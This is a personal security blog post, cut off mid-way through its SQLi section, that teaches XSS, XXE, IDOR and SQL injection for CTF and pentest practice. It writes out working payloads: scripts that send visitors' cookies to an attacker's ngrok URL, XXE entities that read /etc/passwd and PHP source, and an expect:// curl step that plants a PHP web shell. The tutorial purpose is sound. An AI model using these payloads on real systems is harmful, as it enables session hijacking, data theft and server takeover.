<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Notes Common Web Attacks" /><meta name="author" content="BatBato" /><meta property="og:locale" content="en" /><meta name="description" content="Common Web Attacks" /><meta property="og:description" content="Common Web Attacks" /><link rel="canonical" href="nouman404.github.io/Notes/Web/Common_Web_Attacks" /><meta property="og:url" content="nouman404.github.io/Notes/Web/Common_Web_Attacks" /><meta property="og:site_name" content="BatBato’s Blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-09-11T00:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Notes Common Web Attacks" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@BatBato" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"BatBato"},"dateModified":"2023-06-12T22:10:25+02:00","datePublished":"2022-09-11T00:00:00+02:00","description":"Common Web Attacks","headline":"Notes Common Web Attacks","mainEntityOfPage":{"@type":"WebPage","@id":"nouman404.github.io/Notes/Web/Common_Web_Attacks"},"url":"nouman404.github.io/Notes/Web/Common_Web_Attacks"}</script><title>Notes | Common Web Attacks | BatBato's Blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="BatBato's Blog"><meta name="application-name" content="BatBato's Blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/icon.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">BatBato's Blog</a></div><div class="site-subtitle font-italic">BatBato was here :)</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/notes/" class="nav-link"> <i class="fa-fw fas fa-sticky-note ml-xl-3 mr-xl-3 unloaded"></i> <span>NOTES</span> </a><li class="nav-item"> <a href="/sources/" class="nav-link"> <i class="fa-fw fas fa-folder-open ml-xl-3 mr-xl-3 unloaded"></i> <span>SOURCES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/Nouman404" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://app.hackthebox.com/profile/235762" aria-label="hackthebox" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a> <a href="https://tryhackme.com/p/Batbato" aria-label="tryhackme" target="_blank" rel="noopener"> <i class="fas fa-cloud"></i> </a> <a href="https://www.root-me.org/BatBato" aria-label="rootme" target="_blank" rel="noopener"> <i class="fas fa-skull"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Notes | Common Web Attacks</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Notes | Common Web Attacks</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1662847200" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Sep 11, 2022 </em> </span> <span> Updated <em class="" data-ts="1686600625" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jun 12, 2023 </em> </span><div class="d-flex justify-content-between"> <span> By <em> Bat </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2656 words"> <em>14 min</em> read</span></div></div></div><div class="post-content"><h1 id="common-web-attacks">Common Web Attacks</h1><p>The World Wide Web allows us to access a lot of information over the internet, whether it is a movie, your family pictures or your mail. This is also a very big battlefield between every kind of hackers. Here, we are going to talk about common web vulnerabilities such as Cross Site Scripting (<code class="language-plaintext highlighter-rouge">XSS</code>), XML External Entity (<code class="language-plaintext highlighter-rouge">XXE</code>), Insecure Direct Object Reference (<code class="language-plaintext highlighter-rouge">IDOR</code>) and SQL Injection (<code class="language-plaintext highlighter-rouge">SQLi</code>).</p><h2 id="xss"><span class="mr-2">XSS</span><a href="#xss" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>XSS vulnerability result in the possibility for a user to execute Java Script code in the web page. This can change the content of the page or steal connection cookies, for example. You can find a basic exmplanation of XSS on <a href="https://www.youtube.com/watch?v=L5l9lSnNMxg">this video</a>. There are three different type of XSS :</p><ul><li><a href="/Notes/Web/Common_Web_Attacks#reflected-xss">Reflected XSS</a>, where the malicious script comes from the current HTTP request.<li><a href="/Notes/Web/Common_Web_Attacks#stored-xss">Stored XSS</a>, where the malicious script comes from the website’s database.<li><a href="/Notes/Web/Common_Web_Attacks#dom-based-xss">DOM-based XSS</a>, where the vulnerability exists in client-side code rather than server-side code.</ul><h3 id="reflected-xss"><span class="mr-2">Reflected XSS</span><a href="#reflected-xss" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The most basic type of cross-site scripting is <code class="language-plaintext highlighter-rouge">Reflected XSS</code>. It occurs when an application receives data from an HTTP request and unsafely incorporates that data into the immediate response.</p><p>A very simple example will be the following. Imagine a webpage that ask for the user name and execute the following <code class="language-plaintext highlighter-rouge">GET</code> request :</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="go">https://insecure-website.com/search?name=bob
</span></pre></table></code></div></div><p>This request will then print <code class="language-plaintext highlighter-rouge">Your name is : NAME</code> where <code class="language-plaintext highlighter-rouge">NAME</code> will be replaced by the name given. If the website is vulnerable to <code class="language-plaintext highlighter-rouge">Reflected XSS</code>, we could put a script as a name like :</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">https://insecure-website.com/search?name=&lt;script&gt;</span>JS_CODE&lt;/script&gt;
</pre></table></code></div></div><p>You can replace <code class="language-plaintext highlighter-rouge">JS_CODE</code> by anything you want. A basic test could be :</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">alert</code> JS function will create a pop-up that will display the text between the brackets. But as stated in <a href="https://www.youtube.com/watch?v=KHwVjzWei1c">this video</a> of <a href="https://www.youtube.com/c/LiveOverflow">LiveOverflow</a>, the <code class="language-plaintext highlighter-rouge">alert(1)</code> isn’t a good practice and can lead to false positive. A better way to test XSS could be the use of <code class="language-plaintext highlighter-rouge">alert(document.domain)</code> or <code class="language-plaintext highlighter-rouge">alert(windows.origin)</code> you could even use the <code class="language-plaintext highlighter-rouge">console.log</code> JS function.</p><h3 id="stored-xss"><span class="mr-2">Stored XSS</span><a href="#stored-xss" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p><code class="language-plaintext highlighter-rouge">Second-order</code> or <code class="language-plaintext highlighter-rouge">persistent XSS</code>, often known as <code class="language-plaintext highlighter-rouge">Stored XSS</code>, occurs when an application obtains data from an unreliable source and includes that data inadvertently in subsequent HTTP responses.</p><p>As its name suggest, the <code class="language-plaintext highlighter-rouge">Stored XSS</code> is <code class="language-plaintext highlighter-rouge">Stored</code> in the server. It often appears when someone leaves a comment and that other people can read it. The attack is basically the same for every type of XSS so you can use the previous techniques to check if the website is vulnerable.</p><h3 id="dom-based-xss"><span class="mr-2">DOM-based XSS</span><a href="#dom-based-xss" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>When client-side JavaScript in an application handles data from an untrusted source in an unsafe manner, typically by publishing the data back to the DOM, this is referred to as <code class="language-plaintext highlighter-rouge">DOM-based XSS</code>, also known as <code class="language-plaintext highlighter-rouge">DOM XSS</code>.</p><p><code class="language-plaintext highlighter-rouge">DOM-based XSS</code> are a bit harder to find. First we want to check for JS code in the page that we can interact with, like a <code class="language-plaintext highlighter-rouge">document.write</code> that write our input, for example. <code class="language-plaintext highlighter-rouge">DOM.innerHTML</code> and <code class="language-plaintext highlighter-rouge">DOM.outerHTML</code> are other JS function that write DOM objects (<code class="language-plaintext highlighter-rouge">add()</code>, <code class="language-plaintext highlighter-rouge">after()</code>, <code class="language-plaintext highlighter-rouge">append()</code> are some JQuery functions that write DOM objects). Once we understand how the script work we may want to close some HTML tags so that we can input our JS malicious code. This is an example that show how to close a simple HTML tag that includes our input in its field (like an image for example) :</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">https://insecure-website.com/search?name="&gt;</span>&lt;script&gt;JS_CODE&lt;/script&gt;
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>You can find more detailed information about XSS on the <a href="https://portswigger.net/web-security/cross-site-scripting">PortSwigger website</a>.</p></div></blockquote><blockquote class="prompt-tip"><div><p>You can use the <code class="language-plaintext highlighter-rouge">document.cookie</code> JS function to retrieve the cookie of a user.</p></div></blockquote><h3 id="session-hijaking"><span class="mr-2">Session Hijaking</span><a href="#session-hijaking" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>XSS can be used to recover sensitive information like connection cookies. We need to setup our environment so that the payload can send us back the information. First, we will start a <code class="language-plaintext highlighter-rouge">php server</code> on our machine and then use <code class="language-plaintext highlighter-rouge">ngrok</code> so that our web server is available anywhere online.</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>php <span class="nt">-S</span> localhost:1234
</pre></table></code></div></div><p>and</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ngrok http 1234
</pre></table></code></div></div><blockquote class="prompt-tip"><div><p>In real case scenario or in realistic CTF you may want to use a more standard port like <code class="language-plaintext highlighter-rouge">443</code> which is the port for <code class="language-plaintext highlighter-rouge">HTTPS</code></p></div></blockquote><blockquote class="prompt-danger"><div><p>You may need to create a Ngrok account for this to work. Visit the created page and it should ask you to create an account.</p></div></blockquote><p>Now that our environment is ready we can send our payload like :</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span><span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">[URL]?</span><span class="dl">"</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>or</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="dl">"</span><span class="s2">[URL]?</span><span class="dl">"</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span><span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>or</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;img src="[URL]?</span><span class="dl">'</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="o">+</span><span class="dl">'</span><span class="s1">"/&gt;</span><span class="dl">'</span><span class="p">);</span><span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>Don’t forget to replace <code class="language-plaintext highlighter-rouge">[URL]</code> by the url ngrok gives you. This will send the cookie of the person that visit the page where our payload is executed. You can find many other payload on <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md">PayloadsAllTheThings</a>.</p><h3 id="automation"><span class="mr-2">Automation</span><a href="#automation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>There are many tools out here that can help you detect XSS vulnerabilities like <a href="https://www.tenable.com/products/nessus">Nessus</a>, <a href="https://portswigger.net/burp/pro">Burp Pro</a>, <a href="https://owasp.org/www-project-zap/">ZAP</a>. There are also some opensource tools that you can find on github like <a href="https://github.com/s0md3v/XSStrike">XSStrike</a>, <a href="https://github.com/rajeshmajumdar/BruteXSS">BruteXSS</a> or <a href="https://github.com/epsylon/xsser">XSSer</a>. Here is a list of different payload you may want to try when looking for XSS vulnerabilities <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md">PayloadsAllTheThings</a>.</p><hr /><h2 id="xxe"><span class="mr-2">XXE</span><a href="#xxe" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><code class="language-plaintext highlighter-rouge">XML eXternal Entity</code> injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application’s processing of XML data. This allows an attackers to interact with any back-end or external systems that the program itself can access as well as examine files on the application server disk.</p><p>By using the XXE vulnerability to launch <code class="language-plaintext highlighter-rouge">Server-Side Request Forgery</code> (SSRF) attacks, an attacker may be able to escalate a XXE assault to compromise the underlying server or other back-end infrastructure in some circumstances.</p><p><code class="language-plaintext highlighter-rouge">Extensible Markup Language</code> (XML) is a markup language and file format for <code class="language-plaintext highlighter-rouge">storing</code>, <code class="language-plaintext highlighter-rouge">transmitting</code>, and <code class="language-plaintext highlighter-rouge">reconstructing arbitrary data</code>. It defines a set of rules for encoding documents in a format that is both <code class="language-plaintext highlighter-rouge">human-readable</code> and <code class="language-plaintext highlighter-rouge">machine-readable</code>.</p><p>Here is a list of some of the key elements of an XML document :</p><div class="table-wrapper"><table><thead><tr><th>Key<th>Definition<th>Example<tbody><tr><td><code class="language-plaintext highlighter-rouge">Tag</code><td>The keys of an XML document, usually wrapped with (&lt;/&gt;) characters.<td><code class="language-plaintext highlighter-rouge">&lt;date&gt;</code><tr><td><code class="language-plaintext highlighter-rouge">Entity</code><td>XML variables, usually wrapped with (&amp;/;) characters.<td><code class="language-plaintext highlighter-rouge">&amp;lt;</code><tr><td><code class="language-plaintext highlighter-rouge">Element</code><td>The root element or any of its child elements, and its value is stored in between a start-tag and an end-tag.<td><code class="language-plaintext highlighter-rouge">&lt;date&gt;20-10-2022&lt;/date&gt;</code><tr><td><code class="language-plaintext highlighter-rouge">Attribute</code><td>Optional specifications for any element that are stored in the tags, which may be used by the XML parser.<td><code class="language-plaintext highlighter-rouge">version="1.0"/encoding="UTF-8"</code><tr><td><code class="language-plaintext highlighter-rouge">Declaration</code><td>Usually the first line of an XML document, and defines the XML version and encoding to use when parsing it.<td><code class="language-plaintext highlighter-rouge">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</code></table></div><h3 id="dtd"><span class="mr-2">DTD</span><a href="#dtd" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The XML <code class="language-plaintext highlighter-rouge">Document Type Definition</code> (DTD) contains declarations that can define the structure of an XML document, the types of data values it can contain, and other items. The <code class="language-plaintext highlighter-rouge">DTD</code> is declared within the optional <code class="language-plaintext highlighter-rouge">DOCTYPE</code> element at the start of the XML document. The DTD can be fully self-contained within the document itself (known as an <code class="language-plaintext highlighter-rouge">internal DTD</code>) or can be loaded from elsewhere (known as an <code class="language-plaintext highlighter-rouge">external DTD</code>) or can be hybrid of the two.</p><h3 id="xml-entities"><span class="mr-2">XML Entities</span><a href="#xml-entities" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>In XML, we can create custom entities that can be defined within the DTD :</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE foo [ &lt;!ENTITY entity_ref "my value" &gt;</span> ]&gt;
</pre></table></code></div></div><p>This definition means that any usage of the entity reference <code class="language-plaintext highlighter-rouge">&amp;entity_ref</code>; within the XML document will be replaced with the defined value: <code class="language-plaintext highlighter-rouge">my value</code>.</p><p>External entities can be used with the <code class="language-plaintext highlighter-rouge">SYSTEM</code> attribute. We can access files or resources from other websites :</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE foo [ &lt;!ENTITY ext_entity SYSTEM "http://website.com" &gt;</span> ]&gt;
</pre></table></code></div></div><p>or</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE foo [ &lt;!ENTITY ext_entity SYSTEM "file:///path/to/file" &gt;</span> ]&gt;
</pre></table></code></div></div><blockquote class="prompt-tip"><div><p>This can allow us to access files such as the <code class="language-plaintext highlighter-rouge">passwd</code> one like this : <code class="language-plaintext highlighter-rouge">&lt;!ENTITY read SYSTEM 'file:///etc/passwd'&gt;</code></p></div></blockquote><h3 id="usage"><span class="mr-2">Usage</span><a href="#usage" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>First of all, we need to intercept a request made to the server to see if our request has its data written in XML. Then we need to spot where we can use a XXE. If you fill out a form and they tell you something like “an email has been sent to XXX@YYY.com” then you may need to exploit the email part of the form. We now can use a simple payload to see if it’s vulnerable like :</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE email [
  &lt;!ENTITY user_mail "Test Text"&gt;</span>
]&gt;
</pre></table></code></div></div><p>Now if the previous text says “an email has been sent to Test Text” it may be vulnerable. We can now use the same technic to read files like we saw previously. But if we try to read the source code of a <code class="language-plaintext highlighter-rouge">.php</code> file it may not work because it will print the page instead of its source code. To read is source code, we can use the <a href="/Notes/Web/Command_Injection#data-wrapper">PHP Wrapper</a> technic :</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE email [
  &lt;!ENTITY user_mail SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;</span>
]&gt;
</pre></table></code></div></div><p>This command will print the source code of <code class="language-plaintext highlighter-rouge">index.php</code> encoded in <code class="language-plaintext highlighter-rouge">base64</code>. You can use online tools such as <a href="https://www.base64decode.org/">base64decode.org</a>, the <a href="https://portswigger.net/burp/documentation/desktop/tools/decoder">BurpSuite Decoder</a> or the bash command to decode it :</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s2">"BASE64_ENCODED_TEXT"</span> | <span class="nb">base64</span> <span class="nt">-d</span> 
</pre></table></code></div></div><p>You can use the <a href="https://nouman404.github.io/Notes/Web/Command_Injection#except-wrapper">Exept Wrapper</a> to create a RCE with the basic <code class="language-plaintext highlighter-rouge">expect://id</code> or like that :</p><ol><li>Create a php shell :</ol><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s1">'&lt;?php system($_REQUEST["cmd"]);?&gt;'</span> <span class="o">&gt;</span> shell.php
</pre></table></code></div></div><ol><li>Create a web server to host our php shell</ol><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80
</pre></table></code></div></div><ol><li>Use the XXE to upload our shell</ol><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0"?&gt;</span>
<span class="cp">&lt;!DOCTYPE email [
  &lt;!ENTITY user_mail SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'"&gt;</span>
]&gt;
</pre></table></code></div></div><hr /><h2 id="idor"><span class="mr-2">IDOR</span><a href="#idor" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><code class="language-plaintext highlighter-rouge">Insecure direct object references</code> (IDOR) are a type of <a href="https://portswigger.net/web-security/access-control">access control</a> vulnerability that arises when an application uses user-supplied input to access objects directly.</p><p>A typical example would be a get parametter that isn’t sanitized :</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="go">http://insecure_website/index.php?user_id=43
</span></pre></table></code></div></div><p>If we are the user with the <code class="language-plaintext highlighter-rouge">ID 43</code> what could possibly happen if we change this value to <code class="language-plaintext highlighter-rouge">0</code> or <code class="language-plaintext highlighter-rouge">1</code> ? Generally the first user is the admin. Just exposing a direct reference to an internal object or resource is not a vulnerability in itself. For example, if the ID we specify is for the number of a page. It’s all about weak access control system.</p><blockquote class="prompt-info"><div><p>You can read more about access control <a href="https://portswigger.net/web-security/access-control">here</a></p></div></blockquote><p>When looking, like here, for <code class="language-plaintext highlighter-rouge">ID</code>, <code class="language-plaintext highlighter-rouge">name</code> or any other type of <code class="language-plaintext highlighter-rouge">token</code> we may want to automate the process so we don’t do all the research by hand. We can use tools such as the <code class="language-plaintext highlighter-rouge">Burp Intruder</code>, the <code class="language-plaintext highlighter-rouge">ZAP fuzzer</code> or even tools such as <code class="language-plaintext highlighter-rouge">ffuf</code>.</p><hr /><h2 id="sqli"><span class="mr-2">SQLi</span><a href="#sqli" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>SQL is a language that allows us to ask information to a database. This information can be name, adress, date, password… It can be anything we want. These queries are made in a DBMS (<code class="language-plaintext highlighter-rouge">DataBase Management System</code>), the most famous are <code class="language-plaintext highlighter-rouge">SQLite</code>, <code class="language-plaintext highlighter-rouge">MySQL</code>, <code class="language-plaintext highlighter-rouge">MariaDB</code>, <code class="language-plaintext highlighter-rouge">Microsoft SQL Server</code> or even <code class="language-plaintext highlighter-rouge">Oracle DBMS</code>. The goal here is not to teach you how SQL work or what are all the differences between tow DBMS but you can read <a href="https://www.altexsoft.com/blog/business/comparing-database-management-systems-mysql-postgresql-mssql-server-mongodb-elasticsearch-and-others/">this article</a> for more information. We are just going to see the bases so you are not completely lost but I advise you to follow some courses about the SQL language.</p><h3 id="definition"><span class="mr-2">Definition</span><a href="#definition" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>For this example, we are going to imagine a database of a school with professors and students:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 600 300'%3E%3C/svg%3E" data-src="https://user-images.githubusercontent.com/73934639/189689960-0ecc2be0-e986-41d8-ba71-6448a65c4c18.png" alt="image" width="600" height="300" data-proofer-ignore></p><p>As you can see there are two teachers and two students. Professor and Teacher are the two <code class="language-plaintext 